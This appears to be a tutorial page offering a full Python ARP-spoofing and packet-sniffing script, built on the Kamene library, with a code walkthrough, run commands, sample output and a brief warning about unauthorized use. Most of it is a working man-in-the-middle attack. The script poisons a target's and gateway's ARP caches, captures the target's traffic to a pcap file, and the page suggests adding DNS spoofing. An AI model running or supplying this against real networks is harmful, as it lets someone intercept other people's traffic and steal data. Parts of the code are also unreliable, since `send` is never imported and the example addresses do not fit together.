# **Python ARP Spoofing & Sniffing Script**  

This script **performs ARP poisoning** to intercept network traffic between a target and a gateway while capturing packets for analysis. 🚨 

```python
import kamene.all as kam
import sys
import threading
import time

# get your VM data running from a shell 
# $ipconfig 
# $arp -a 

interface = "en1"
tgt_ip = "172.16.1.255"
tgt_gateway = "172.17.55.245"
packet_count = 500
poisoning = True

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Restoring target...")
    send(kam.ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac),count=5)
    send(kam.ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac),count=5)
    
def get_mac(ip_address):
    responses, unanswered = kam.srp(kam.Ether(dst="ff:ff:ff:ff:ff:ff") / kam.ARP(pdst=ip_address), timeout=2, retry=10)

    # return mac address from response
    for s,r in responses:
        return r[kam.Ether].src
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    global poisoning

    poison_tgt = kam.ARP()
    poison_tgt.op = 2
    poison_tgt.psrc = gateway_ip
    poison_tgt.pdst = target_ip
    poison_tgt.hwdst = target_mac

    poison_gateway = kam.ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    while poisoning:
        send(poison_tgt)
        send(poison_gateway)
        time.sleep(2)

    print("[*] ARP poison attack finished")

    return

# set out our interface
kam.conf.iface = interface

# turn off output
kam.conf.verb = 0

print(f"[*] Setting up {interface}")

tgt_gateway_mac = get_mac(tgt_gateway)

if tgt_gateway_mac is None:
    print("[!!!] Failed to get gateway MAC. Exiting.")
    sys.exit(0)
else:
    print(f"[*] Gateway {tgt_gateway} is at {tgt_gateway_mac}")

tgt_mac = get_mac(tgt_ip)

if tgt_mac is None:
    print("[!!!] Failed to get target MAC. Exiting.")
    sys.exit(0)
else:
    print(f"[*] Target {tgt_ip} is at {tgt_mac}")

# start poison thread
poison_thread = threading.Thread(target=poison_target, 
                                args=(tgt_gateway, tgt_gateway_mac, tgt_ip, tgt_mac))
poison_thread.start()

try:
    print(f"[*] Starting sniffer for {packet_count} packets")
    bpf_filter = f"ip host {tgt_ip}"
    packets = kam.sniff(count=packet_count, filter=bpf_filter, iface=interface)
    print(f"[*] Writing packets to arper.pcap")
    kam.wrpcap("arper.pcap", packets)

except KeyboardInterrupt:
    pass

finally:
    poisoning = False
    time.sleep(2)

    #restore the network
    restore_target(tgt_gateway, tgt_gateway_mac, tgt_ip, tgt_mac)

sys.exit()
```

# **Python ARP Spoofing & Sniffing Script**  

This script **performs ARP poisoning** to intercept network traffic between a target and a gateway while capturing packets for analysis. 🚨  

---

## **1. How It Works**  

### **🔹 Overview**  
1. **Retrieves MAC addresses** of the target and gateway.  
2. **Performs ARP poisoning** to trick both into sending traffic through the attacker's machine.  
3. **Sniffs and captures packets** from the target.  
4. **Restores ARP tables** to avoid network disruption after execution.  

---

## **2. Code Breakdown**  

### **🔹 Importing Dependencies**  
```python
import kamene.all as kam
import sys
import threading
import time
```
- **Kamene** (a fork of Scapy) is used for packet crafting and sniffing.  
- **`threading`** allows ARP poisoning to run in the background.  

---

### **🔹 Configuration Variables**  
```python
interface = "en1"  # Change based on your network adapter
tgt_ip = "172.16.1.255"  
tgt_gateway = "172.17.55.245"  
packet_count = 500  
poisoning = True  
```
- **`interface`** → The network adapter to use for packet sniffing.  
- **`tgt_ip`** → Target machine’s IP address.  
- **`tgt_gateway`** → Gateway (router) IP address.  
- **`packet_count`** → Number of packets to capture.  

---

### **🔹 Function: Restore ARP Tables**  
```python
def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Restoring target...")
    send(kam.ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(kam.ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
```
- Sends **legitimate ARP responses** to restore network integrity after poisoning.  

---

### **🔹 Function: Get MAC Address**  
```python
def get_mac(ip_address):
    responses, unanswered = kam.srp(kam.Ether(dst="ff:ff:ff:ff:ff:ff") / kam.ARP(pdst=ip_address), timeout=2, retry=10)
    for s, r in responses:
        return r[kam.Ether].src
    return None
```
- Sends an **ARP request** to the target and retrieves its **MAC address**.  

---

### **🔹 Function: ARP Poisoning**  
```python
def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    global poisoning

    poison_tgt = kam.ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    poison_gateway = kam.ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    while poisoning:
        send(poison_tgt)
        send(poison_gateway)
        time.sleep(2)

    print("[*] ARP poison attack finished")
```
- **Sends fake ARP replies** to both target and gateway, forcing traffic through the attacker's machine.  
- Runs in a **continuous loop** until the user stops it.  

---

### **🔹 Sniffing Network Traffic**  
```python
print(f"[*] Starting sniffer for {packet_count} packets")
bpf_filter = f"ip host {tgt_ip}"
packets = kam.sniff(count=packet_count, filter=bpf_filter, iface=interface)
print(f"[*] Writing packets to arper.pcap")
kam.wrpcap("arper.pcap", packets)
```
- Uses `kam.sniff()` to **capture network traffic** from the target.  
- Saves captured packets to a **PCAP file** (`arper.pcap`) for further analysis.  

---

### **🔹 Cleanup & Exit**  
```python
finally:
    poisoning = False
    time.sleep(2)
    restore_target(tgt_gateway, tgt_gateway_mac, tgt_ip, tgt_mac)
sys.exit()
```
- **Stops ARP poisoning** and **restores the network** before exiting.  

---

## **3. How to Run the Script**  

### **🔹 Prerequisites**  
- **Python 3.x**  
- **Kamene library** (`pip install kamene`)  
- **Root/Administrator privileges** (required for raw packet manipulation)  

### **🔹 Run on Linux/macOS**  
```sh
sudo python3 arpspoof.py
```

### **🔹 Run on Windows**  
1. Open **Command Prompt** as Administrator.  
2. Execute:  
   ```sh
   python arpspoof.py
   ```

---

## **4. Expected Output Example**  

```sh
[*] Setting up en1
[*] Gateway 172.17.55.245 is at 00:1a:2b:3c:4d:5e
[*] Target 172.16.1.255 is at 00:aa:bb:cc:dd:ee
[*] Beginning the ARP poison. [CTRL-C to stop]
[*] Starting sniffer for 500 packets
[*] Writing packets to arper.pcap
[*] Restoring target...
```
- Shows **MAC addresses** of the gateway and target.  
- **Indicates ARP poisoning is running**.  
- **Starts sniffing and saves traffic** to a file.  
- **Restores the network when finished**.  

---

## **5. Ethical Considerations 🚨**  
⚠ **WARNING:** Unauthorized ARP poisoning is illegal and can **disrupt network operations**. Only use this script for **educational purposes** and **authorized penetration testing**.  

---

## **6. Enhancements & Improvements**  
✅ **Detect ARP poisoning** using Scapy/Kamene and alert users.  
✅ **Auto-detect network interface** instead of hardcoding.  
✅ **Log packets in real-time** instead of waiting for script termination.  
✅ **Perform DNS spoofing** to redirect traffic.  

